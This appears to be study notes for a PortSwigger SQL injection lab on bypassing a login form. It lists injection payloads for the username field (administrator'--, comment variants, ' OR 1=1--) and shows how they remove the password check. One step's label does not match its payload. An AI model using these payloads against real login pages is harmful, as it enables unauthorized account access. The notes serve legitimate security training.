-- PortSwigger SQLi Lab 02 — Login Bypass
-- Target parameter: username field in POST /login
-- Injection point: WHERE clause username condition

-- Step 1: Test for SQL injection (trigger error)
'

-- Step 2: Basic comment injection — bypass password check for known user
administrator'--

-- Step 3: Variations using different comment styles
administrator'#           -- MySQL comment style
administrator'/*          -- block comment open

-- Step 4: Login as any user without knowing the username
' OR 1=1--

-- Step 5: Target a specific user by position
' OR '1'='1

-- How the payload modifies the query:
-- Original: SELECT * FROM users WHERE username = '' AND password = ''
-- Injected: SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
-- Result:   SELECT * FROM users WHERE username = 'administrator'
--           (password check commented out, returns admin user, login succeeds)
